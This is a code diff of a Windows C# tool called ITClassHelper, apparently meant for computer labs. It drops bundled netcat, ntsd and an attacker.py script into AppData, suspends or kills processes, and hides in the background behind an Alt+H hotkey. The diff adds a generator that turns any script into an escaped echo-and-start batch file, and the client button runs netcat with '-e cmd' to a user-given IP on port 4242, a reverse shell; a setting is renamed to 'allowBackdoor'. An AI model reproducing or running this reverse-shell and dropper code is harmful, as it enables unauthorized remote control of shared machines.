@@ -1,6 +1,7 @@
 ﻿using Microsoft.VisualBasic;
 using Microsoft.Win32;
 using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.Drawing;
 using System.IO;
@@ -35,24 +36,19 @@ namespace ITClassHelper
                 Synchronize = 0x100000
             }
 
-            [DllImport("ntdll.dll")]
-            private static extern uint NtResumeProcess([In] IntPtr processHandle);
+            [DllImport("ntdll.dll")] private static extern uint NtResumeProcess([In] IntPtr processHandle);
 
-            [DllImport("ntdll.dll")]
-            private static extern uint NtSuspendProcess([In] IntPtr processHandle);
+            [DllImport("ntdll.dll")] private static extern uint NtSuspendProcess([In] IntPtr processHandle);
 
-            [DllImport("ntdll.dll")]
-            private static extern uint NtTerminateProcess([In] IntPtr processHandle);
+            [DllImport("ntdll.dll")] private static extern uint NtTerminateProcess([In] IntPtr processHandle);
 
-            [DllImport("kernel32.dll", SetLastError = true)]
-            private static extern IntPtr OpenProcess(
-             ProcessAccess desiredAccess,
-             bool inheritHandle,
-             int processId);
+            [DllImport("kernel32.dll")] private static extern IntPtr OpenProcess(
+                ProcessAccess desiredAccess,
+                bool inheritHandle,
+                int processId
+            );
 
-            [DllImport("kernel32.dll", SetLastError = true)]
-            [return: MarshalAs(UnmanagedType.Bool)]
-            private static extern bool CloseHandle([In] IntPtr handle);
+            [DllImport("kernel32.dll")] [return: MarshalAs(UnmanagedType.Bool)] private static extern bool CloseHandle([In] IntPtr handle);
 
             public static void TerminateProcess(int processId)
             {
@@ -131,17 +127,17 @@ namespace ITClassHelper
         }
 
         readonly MiniController miniController = new MiniController();
-        static readonly string ProgramVersion = "2.0.2";
+        static readonly string ProgramVersion = "2.0.4";
         static readonly string appdataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
         static readonly string attackerPath = appdataPath + @"\attacker.py";
-        static readonly string scripterPath = appdataPath + @"\ITCHScripter.exe";
         static readonly string ncPath = appdataPath + @"\nc.exe";
         static readonly string ntsdPath = appdataPath + @"\ntsd.exe";
         static readonly string pythonInstallerPath = Application.StartupPath + @"\PythonInstaller.exe";
         static readonly string disableAttackFilePath = appdataPath + @"\disableAttack.txt";
-        static readonly string allowNcFilePath = appdataPath + @"\allowNcAttack.txt";
+        static readonly string allowBackdoorFilePath = appdataPath + @"\allowNcAttack.txt";
         static readonly string helpDocPath = appdataPath + @"\HELPPAGE.md";
         static string attackScriptPath, roomPath;
+        static bool firstTimeHide = true;
 
         [DllImport("user32.dll")]
         public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
@@ -157,17 +153,24 @@ namespace ITClassHelper
             miniController.Show();
             miniController.Hide();
             HotKey.RegisterHotKey(Handle, 100, HotKey.KeyModifiers.Alt, Keys.H);
+            if (ProgramVersion.Contains("dev")) MessageBox.Show("这是一个内测版本，尚不稳定，请小心操作！", "警告", MessageBoxButtons.OK, MessageBoxIcon.Warning);
         }
 
         private void MainWindow_Load(object sender, EventArgs e)
         {
+            if (Process.GetProcessesByName("ITClassHelper").Length > 1)
+            {
+                MessageBox.Show("机房助手已在运行！点击[确认]退出当前进程！", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                Environment.Exit(0);
+            }
+
             if (File.Exists(disableAttackFilePath))
             {
                 DisableAttackButton.Enabled = false;
                 AttackButton.Enabled = false;
             }
 
-            if (File.Exists(allowNcFilePath))
+            if (File.Exists(allowBackdoorFilePath))
             {
                 NcLabel.Visible = true;
                 NcServerButton.Visible = NcServerButton.Enabled = true;
@@ -186,11 +189,6 @@ namespace ITClassHelper
             FileStream attackerFsObj = new FileStream(attackerPath, FileMode.Create);
             attackerFsObj.Write(RescAttacker, 0, RescAttacker.Length);
             attackerFsObj.Close();
-
-            byte[] RescScripter = Properties.Resources.Scripter;
-            FileStream scripterFsObj = new FileStream(scripterPath, FileMode.Create);
-            scripterFsObj.Write(RescScripter, 0, RescScripter.Length);
-            scripterFsObj.Close();
 
             byte[] RescNetCat = Properties.Resources.NetCat;
             FileStream netCatFsObj = new FileStream(ncPath, FileMode.Create);
@@ -526,7 +524,45 @@ Include_tcltk=1 Include_test=1 Include_tools=1";
             };
             if (fileDialog.ShowDialog() == DialogResult.OK)
             {
-                ExecuteProcess(scripterPath, fileDialog.FileName, true);
+                string scriptPath = fileDialog.FileName;
+                int lines = 0;
+                FileStream fs = new FileStream(scriptPath, FileMode.OpenOrCreate, FileAccess.ReadWrite);
+                StreamReader lineSr = new StreamReader(fs);
+                while (lineSr.ReadLine() != null)
+                {
+                    lines++;
+                }
+                fs.Close();
+                lineSr.Close();
+                string scriptName = Interaction.InputBox("请输入脚本文件名：", "信息", "", -1, -1);
+                List<string> newLines = new List<string>(lines + 2);
+                using (StreamReader sr = new StreamReader(scriptPath))
+                {
+                    newLines.Add($@"del /f /q C:\{scriptName}");
+                    string line, newLine = "";
+                    while ((line = sr.ReadLine()) != null)
+                    {
+                        newLine = "echo ";
+                        foreach (char c in line)
+                        {
+                            if ((c >= '0' && c <= '9') || (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'))
+                                newLine += c;
+                            else newLine += "^" + c;
+                        }
+                        newLine += $@" >>C:\{scriptName}";
+                        newLines.Add(newLine);
+                    }
+                    newLines.Add($@"start C:\{scriptName}");
+                }
+
+                using (StreamWriter sw = new StreamWriter(scriptName.Split('.')[0] + ".bat"))
+                {
+                    foreach (string s in newLines)
+                    {
+                        sw.WriteLine(s);
+                    }
+                }
+                MessageBox.Show($@"脚本已保存到 {Directory.GetCurrentDirectory()}\{scriptName}！", "信息", MessageBoxButtons.OK, MessageBoxIcon.Information);
             }
         }
 
@@ -547,13 +583,29 @@ Include_tcltk=1 Include_test=1 Include_tools=1";
 
         private void NcClientButton_Click(object sender, EventArgs e)
         {
-            if (!File.Exists(allowNcFilePath)) ExecuteProcess(ncPath, $"-e cmd {IPTextBox.Text} 4242");
+            if (!File.Exists(allowBackdoorFilePath)) ExecuteProcess(ncPath, $"-e cmd {IPTextBox.Text} 4242");
             else CmdTextBox.Text = $"{ncPath} -e cmd {GetIPAddress()} 4242";
         }
 
         private void MainWindow_HelpButtonClicked(object sender, System.ComponentModel.CancelEventArgs e)
         {
             ExecuteProcess(helpDocPath, "", true);
+        }
+
+        private void MainWindow_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            e.Cancel = true;
+            Hide();
+            if (firstTimeHide == true)
+            {
+                MessageBox.Show("机房助手已自动隐藏到后台，按下 Alt+H 即可显示！", "信息", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                firstTimeHide = false;
+            }
+        }
+
+        private void ExitProgramButton_Click(object sender, EventArgs e)
+        {
+            Environment.Exit(0);
         }
 
         protected override void WndProc(ref Message msg)
